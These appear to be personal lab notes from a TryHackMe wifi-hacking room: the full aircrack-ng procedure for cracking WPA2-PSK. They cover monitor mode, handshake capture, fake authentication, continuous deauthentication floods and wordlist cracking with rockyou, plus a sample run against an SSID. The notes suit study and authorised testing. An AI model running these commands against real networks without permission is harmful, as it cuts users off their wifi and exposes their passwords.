**key terms**

    - SSID: The network "name" that you see when you try and connect
    - ESSID: An SSID that *may* apply to multiple access points, eg a company office, normally forming a bigger network. For Aircrack they normally refer to the network you're attacking.
    - BSSID: An access point MAC (hardware) address

    - WPA2-PSK: Wifi networks that you connect to by providing a password that's the same for everyone
    - WPA2-EAP: Wifi networks that you authenticate to by providing a username and password, which is sent to a RADIUS server.
    RADIUS: A server for authenticating clients, not just for wifi.

4-way handshake wpa2

WPA2-PSK (personal)
  - can be brute forced
  - minimum password characters = 8 

# [aircrack-ng suite](https://www.aircrack-ng.org/)

WPA networks attack = aircrack-ng, airodump-ng and airmon-ng


ESSID = salt for WPA

`sudo airmon-ng check kill`

This does the following:
```bash
 service network-manager stop
 service avahi-daemon stop
 service upstart-udev-bridge stop
 ```

`kill <PID>`
kills process id

puts interface into monitor mode `sudo airmon-ng start wlan0`


creates new interface = wlan0mon

get BSSID
`sudo airodump-ng wlan0mon`

target BSSID and see if any stations are authenticating 
`airodump-ng wlan0mon -d <BSSID>`

start capturing packets on channel and write to file
`airodump-ng -w crackThis --bssid <bssid> -c <#> wlan0mon`   
-j flag for hashcat output

Inject:

get MAC
`sudo aireplay-ng --arpreplay wlan0mon -e <ESSID> -h <BSSID>`


fake authentication 
`aireplay-ng --fakeauth 0 -a <BSSID> wlan0mon -h <mac>`


deauthorize/deauthenticate 
`aireplay-ng --deauth 0 -e <ESSID> wlan0mon`

`aireplay-ng --deauth 0 -a <BSID> wlan0mon`


look at aireplay results
`aireplay-ng --arpreplay wlan0mon -e <ESSID> -h <BSSID>`

open capfile in wireshark and filter for handshake `eapol` (message 2 should have )


Stop monitor mode on wifi card 
`sudo airmon-ng stop wlan0mon`

restart network manager  (didn't work need to restart)
`
sudo service upstart-udev-bridge start &&
sudo service avahi-daemon start &&
sudo service network-manager start 

Hack the hash
`aircrack-ng <name of cap file> -w <path to wordlist>`


Regular expression for complicated passwords

PHP / JS `/[aA-zA]*[0-9]*[^\w\*]*/gm`

python `r"[aA-zA]*[0-9]*[^\w\*]*"gm`






from THM room 
makes list of 5 random passwords from 10000 rockyou lis  
`head /usr/share/wordlists/rockyou.txt -n 10000 | shuf -n 5`

`<mac address>  -56       13        0    0   4  360   WPA2 CCMP   PSK  illuminati `

monitor and write to file
`airodump-ng wlan0mon --bssid <mac address> --channel 4 --write crackThis`


`aireplay-ng --arpreplay wlan0mon -e illuminati -h <mac address>`

`<mac address>`

`aireplay-ng --fakeauth 0 -a <mac address> wlan0mon -h <mac address>`

`aireplay-ng --deauth 0 -e illuminati wlan0mon`

```bash
airodump-ng wlan0mon --bssid <mac address> --channel 1 --write crackThisOne

aireplay-ng --arpreplay wlan0mon -e Max -h <mac address>

aireplay-ng --fakeauth 0 -a <mac address> wlan0mon -h <mac address>

<mac address>  -31        2        0    0   1  130   WPA2 CCMP   PSK  <network name>
```

sources

[THM](https://tryhackme.com/room/wifihacking101)

[David Bombal](https://www.youtube.com/watch?v=WfYxrLaqlN8)